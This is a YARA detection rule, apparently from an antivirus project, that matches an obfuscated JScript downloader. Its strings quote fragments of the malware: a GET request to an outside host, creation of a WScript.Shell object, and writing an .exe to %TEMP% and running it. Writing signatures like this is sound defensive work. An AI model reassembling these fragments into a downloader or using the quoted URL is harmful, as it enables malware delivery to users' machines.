rule sig_20160330_e842e7b92442da03bc569e9d9034071a {
  meta:
    description = "datamaliciousorder - file 20160330_e842e7b92442da03bc569e9d9034071a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d797c9cb16d8c25c58542e533e7494611ae371d72af35ecedb3378125e40aa7a"

  strings:
    $s1  = "_FA[_I](\"GET\", \"http://sterdicustom.com/w3iks\", false);" fullword ascii
    $s2  = "var _VP = function _HN() {return WScript[_H](\"WScript\"+\".Shell\");}(), _PY = 11;" fullword ascii
    $s3  = "function _PG(_C0, _OP){_HC = _HC * 1; return _C0 - _OP;};" fullword ascii
    $s4  = "if (_FA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _K() {return _VP[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8lHpVVoTfGJ5BqW.ex\" + \"e\";};" fullword ascii
    $s6  = "function _KK(){return _TT + \"\";};" fullword ascii
    $s7  = "function _XD(_HQ){_VP[\"Run\"](_HQ, _HC, _HC);};" fullword ascii
    $s8  = "function _W() {return ((_W0 == true) && (_W0 == _Y)) ? 1 : _HC;};" fullword ascii
    $s9  = " while (_L){" fullword ascii
    $s10 = "function _MZ(){return 22;};" fullword ascii
    $s11 = "var _I0 = new this[\"Date\"]();" fullword ascii
    $s12 = "function _OC(_F) {var _Z = (1, 2, 3, 4, 5, _F); return _Z;};" fullword ascii
    $s13 = "function _YL(){return _H;};" fullword ascii
    $s14 = "function _GM()" fullword ascii
    $s15 = "return _PG(_CX, _QS);" fullword ascii
    $s16 = "_W0 = true; " fullword ascii
    $s17 = "var _W0 = false;" fullword ascii
    $s18 = "var _Y = false;" fullword ascii
    $s19 = "var _H0 = false;" fullword ascii
    $s20 = "_Y = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}